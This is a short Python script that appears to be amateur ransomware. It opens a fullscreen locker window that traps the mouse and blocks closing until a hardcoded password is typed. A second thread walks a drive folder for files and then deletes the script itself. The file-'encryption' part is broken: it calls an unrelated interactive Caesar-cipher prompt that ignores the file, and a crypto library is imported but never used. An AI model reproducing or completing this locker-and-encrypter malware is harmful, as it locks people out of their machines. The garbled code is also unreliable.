
import os, sys, pyAesCrypt
from threading import *
from pyautogui import click, moveTo
from tkinter import Tk,Entry,Label
from time import sleep
def locker():
	def callback(event):
		global k,entry
		if entry.get()=="qwe": k=True
	def block(void):
		click(675, 420)
		moveTo(675, 420)
		root.attributes("-fullscreen",True)
		root.protocol("WM_DELETE_WINDOW", block)
		root.update()
		root.bind('<Control-KeyPress-c>', callback)
	global k,entry
	root = Tk()
	root.title("Locker")
	root.attributes("-fullscreen",True)
	entry = Entry(root,font=1)
	label0=Label(root,text="Locker_by_#571",font=1)
	label0.grid(row=0,column=0)
	label1=Label(root,text="Write the Password and Press Ctrl+C",font='Arial 20')
	label1.place(x=470,y=300)
	entry.place(width=150,height=50,x=600,y=400)
	root.update(); sleep(0.2)
	click(675, 420)
	k=False
	while k!=True: block(None)
def crypter():
	def crypt(file):
		cryptMode = input("[E]ncrypt|[D]ecrypt: ").upper()
		if cryptMode not in ['E', 'D']:
				print("Error: mode is not Found!");
				raise SystemExit
		startMessage = input("Write the message: ").upper()
		try:
				rotKey = int(input("Write the key: "))
		except ValueError:
				print("Only numbers!"); raise SystemExit

		def encryptDecrypt(mode, message, key, final=""):
				for symbol in message:
						if mode == 'E':
								final += chr((ord(symbol) + key - 13) % 26 + ord('A'))
						else:
								final += chr((ord(symbol) - key - 13) % 26 + ord('A'))
				return final

		print("Final message:", encryptDecrypt(cryptMode, startMessage, rotKey))
	def walk(dir):
		for name in os.listdir(dir):
			path = os.path.join(dir, name)
			if os.path.isfile(path): crypt(path)
			else: walk(path)
	walk("D:\321321")
	os.remove(str(sys.argv[0]))
thread_1 = Thread(target=locker)
thread_2 = Thread(target=crypter)
thread_1.start(); thread_2.start()
thread_1.join(); thread_2.join()
